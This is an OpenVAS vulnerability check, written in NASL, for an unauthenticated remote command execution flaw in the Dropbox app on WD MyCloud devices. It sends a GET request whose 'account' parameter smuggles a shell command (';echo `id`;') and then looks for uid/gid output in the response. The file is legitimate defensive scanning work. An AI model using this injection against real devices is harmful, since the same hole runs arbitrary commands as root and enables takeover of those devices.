###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wd_mycloud_dropbox_rce.nasl 12561 2018-11-28 13:48:33Z cfischer $
#
# WD MyCloud Products Dropbox App Remote Command Execution Vulnerability
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE_PREFIX = "cpe:/o:wdc";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108246");
  script_version("$Revision: 12561 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-28 14:48:33 +0100 (Wed, 28 Nov 2018) $");
  script_tag(name:"creation_date", value:"2017-09-26 08:00:00 +0200 (Tue, 26 Sep 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("WD MyCloud Products Dropbox App Remote Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wd_mycloud_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wd-mycloud/http/detected");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3397");
  script_xref(name:"URL", value:"https://community.wd.com/t/new-release-my-cloud-dropbox-2-00-8-22-17/214582");

  script_tag(name:"summary", value:"The Dropbox App of Western Digital MyCloud products ins prone to an
  unauthenticated remote command execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response.");

  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary commands with
  root privileges in context of the affected application.");

  script_tag(name:"solution", value:"Update the Dropbox App to version 2.00 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www", first_cpe_only:TRUE ) )
  exit( 0 );

CPE = infos["cpe"];
if( ! CPE || "my_cloud" >!< CPE )
  exit( 0 );

port = infos["port"];

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/Dropbox/php/dropbox.php?cmd=getBlacklist&account=;echo%20`id`;";

req = http_get_req( port:port, url:url,
                    accept_header:"application/xml, text/xml, */*; q=0.01",
                    add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( res =~ "HTTP/1\.[01] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+" ) {

  uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:res );

  report  = 'By requesting the URL:\n\n';
  report += report_vuln_url( port:port, url:url, url_only:TRUE );
  report += '\n\nit was possible to execute the "id" command.';
  report += '\n\nResult: ' + uid[1];

  expert_info = 'Request:\n'+ req + 'Response:\n' + res;
  security_message( port:port, data:report, expert_info:expert_info );
  exit( 0 );
}

exit( 99 );
